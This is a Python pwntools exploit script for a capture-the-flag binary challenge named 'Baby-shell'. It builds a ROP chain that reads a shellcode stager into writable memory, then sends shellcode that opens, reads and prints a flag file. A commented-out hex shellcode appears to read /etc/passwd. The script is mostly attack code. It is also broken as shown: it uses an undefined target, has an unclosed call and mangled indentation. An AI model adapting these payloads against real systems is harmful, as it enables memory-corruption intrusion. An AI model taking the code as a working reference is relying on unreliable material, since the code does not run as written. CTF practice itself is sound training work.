#!/usr/bin/env python2
'''
author : tripoloski
visit : https://tripoloski1337.github.io/
mail : arsalan.dp@gmail.com
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",

# terminal=["tmux", "split-window", "-v", "-p 85"],)

REMOTE = False
# TARGET=os.path.realpath("/home/ikantongkol/Documents/Binary Exploit/Remote/CTF Nasional/2022/GKSK_2022/Pwn/Baby-shell/chall")
elf = ELF(TARGET)
# def attach(r):
#     if LOCAL:
#         bkps = ["* 0x4040d5"]
#     gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
#     return
def exploit(r):
    attach(r)
    rwx = 0x404080
    p = "A" * 40
    pop_rdi = 0x00000000004013b3
    pop_rsi_r15 = 0x00000000004013b1
    ret = 0x000000000040101a
    p += p64(pop_rdi)
    p += p64(0)
    p += p64(pop_rsi_r15)
    p += p64(rwx)
    p += p64(0)
    p += p64(0x0000000004010b0)
    p += p64(ret)

    p += p64(rwx+3)
    r.sendline(p)
    a = "\x90"*10
    o = asm('''
    mov rdi, 0
    xor rax, rax
    mov rsi, 0x4040d7
    mov rdx, 1000
    syscall
    call rsi
    ''')
    r.sendline("\x90" * 100 + o)
    # STAGE 2
    # etc =
    # "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec
    # \xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\
    # x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\x
    # c0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x6
    # 4\x41"
    etc = asm(shellcraft.open('/home/app/flag').rstrip())
    # etc += asm(shellcraft.getdents('rax', 'rsp', 0x100))
    etc += asm(shellcraft.read('rax','rsp',0x1000))
    etc += asm(shellcraft.write(1, 'rsp', 0x1000))
    r.sendline("\x90" * 100 + etc)
    # r.sendline("\x90" * 10)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
    r = remote("103.145.226.170", 3002)
else:
    LOCAL = True
r = process([TARGET,])
exploit(r)
sys.exit(0)